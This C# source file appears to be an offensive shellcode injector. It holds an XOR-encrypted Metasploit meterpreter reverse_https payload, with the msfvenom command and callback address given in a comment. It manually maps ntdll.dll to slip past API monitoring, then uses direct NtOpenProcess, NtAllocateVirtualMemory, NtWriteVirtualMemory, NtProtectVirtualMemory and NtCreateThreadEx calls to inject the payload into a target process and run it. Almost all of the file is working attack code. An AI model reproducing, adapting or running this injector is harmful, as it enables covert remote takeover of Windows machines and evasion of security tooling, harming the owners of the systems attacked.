
using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;
using Data = DInvoke.Data;


namespace DShellRunnerMapped
{
    class Program
    {


        static void Main(string[] args)
        {


            //Metasploit Shellcode:- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.144 LPORT=443 EXITFUNC=thread -f csharp
            //XOR encrypted
            byte[] buf = new byte[511] {
0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xab, 0xb2, 0xcb, 0x28, 0xac, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab, 0x71, 0xb8, 0xc6, 0xb2,
0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2,
0xe2, 0xaa, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xb7,
0xcb, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x46, 0x85, 0xfa, 0xfa, 0xfb, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
0x2f
};


            //// Decryption routine for the XOR encrypted payload above 
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;


            //Manually map kernel32.dll and search for the function name from the module in the PEB
            Data.PE.PE_MANUAL_MAP moduleDetails = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
            Console.WriteLine("[>] Module Base : " + string.Format("{0:X}", moduleDetails.ModuleBase.ToInt64()) + "\n");



            //NtOpenProcess
            //Specify parameters for NtOpenProcess and place them in an array
            Data.Native.OBJECT_ATTRIBUTES DesiredAccess = new Data.Native.OBJECT_ATTRIBUTES();
            Data.Native.CLIENT_ID ClientId = new Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)uint.Parse(args[0])
            };

            IntPtr ProcHandle = IntPtr.Zero;
            var parameters = new object[]
            {
                ProcHandle,
                Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                DesiredAccess,
                ClientId
            };

            //Call NtOpenProcess
            Data.Native.NTSTATUS hProc = new Data.Native.NTSTATUS();
            hProc = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                moduleDetails.PEINFO,
                moduleDetails.ModuleBase,
                "NtOpenProcess",
                typeof(Native.DELEGATES.NtOpenProcess),
                parameters,
                false);


            //Confirm that we have been able to gain a handle to NtOpenProcesss then assign the process handle to a variable to be used in NtAllocateVirtualMemory
            if (hProc == Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Successfully gained a Handle to the process");
                ProcHandle = (IntPtr)parameters[0];
            }
            else
            {
                Console.WriteLine("[-] Sorry couldn't get a Handle to the process: " + hProc);
            }



            //NtAllocateVirtualMemory
            //Specify parameters for NtAllocateVirtualMemorys and place them in an array

            //Assign values and save results
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(size);


            parameters = new object[]
            {
                ProcHandle,
                baseAddress,
                IntPtr.Zero,
                regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
            };


            //Call NtAllocateVirtualMemory
            hProc = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                moduleDetails.PEINFO,
                moduleDetails.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(Native.DELEGATES.NtAllocateVirtualMemory),
                parameters,
                false);

            //Confirm that we have been able to allocate memory and then assign the base address to a variable to be used in NtWriteVirtualMemory
            if (hProc == Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Alocating memory....");
                baseAddress = (IntPtr)parameters[1];
                Console.WriteLine("[+] Successfully allocated memory for shellcode");
            }
            else
            {
                Console.WriteLine("[-] Sorry Couldn't get a Handle to allocate memory: " + hProc);
            }



            //NtWriteVirtualMemory
            //Specify parameters for NtWriteVirtualMemory and place them in an array

            var buffer = Marshal.AllocHGlobal(size);
            Marshal.Copy(buf, 0, buffer, size);

            uint bytesWritten = 0;

            parameters = new object[]
            {
                ProcHandle,
                baseAddress,
                buffer,
                (uint)size,
                bytesWritten
            };

            //Call NtWriteVirtualMemory
            hProc = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                moduleDetails.PEINFO,
                moduleDetails.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(Native.DELEGATES.NtWriteVirtualMemory),
                parameters,
                false);

            //Confirm we were able to write shellcode to allocated memory
            if (hProc == Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Writing Shellcode to memory ");
            }
            else
            {
                Console.WriteLine("[-] Sorry Couldn't get a Handle to write memory: " + hProc);
            }


            //NtProtectVirtualMemory
            //Specify parameters for NtProtectVirtualMemory and place them in an array

            var oldProtect = 0;

            parameters = new object[]
            {
                ProcHandle,
                baseAddress,
                regionSize,
                Data.Win32.WinNT.PAGE_EXECUTE_READ,
                (uint)oldProtect
            };

            //Call NtProtectVirtualMemory
            hProc = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                moduleDetails.PEINFO,
                moduleDetails.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(Native.DELEGATES.NtProtectVirtualMemory),
                parameters,
                false);

            //Confirm memory protections were set correctly
            if (hProc == Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Set memory protections");
            }
            else
            {
                Console.WriteLine("[-] Sorry Couldn't get a Handle to protect memory: " + hProc);
            }



            //NtCreateThreadEx
            //Specify parameters for ntCreateThreadEx and place them in an array

            var hThread = IntPtr.Zero;

            parameters = new object[]
            {
                hThread,
                Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL,
                IntPtr.Zero,
                ProcHandle,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            };


            //Call NtCreateThreadEx to execute shellcode
            hProc = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
               moduleDetails.PEINFO,
               moduleDetails.ModuleBase,
                "NtCreateThreadEx",
                typeof(Native.DELEGATES.NtCreateThreadEx),
                parameters,
                false);


            Console.WriteLine("[>] Executing Shellcode ");

        }
    }
}
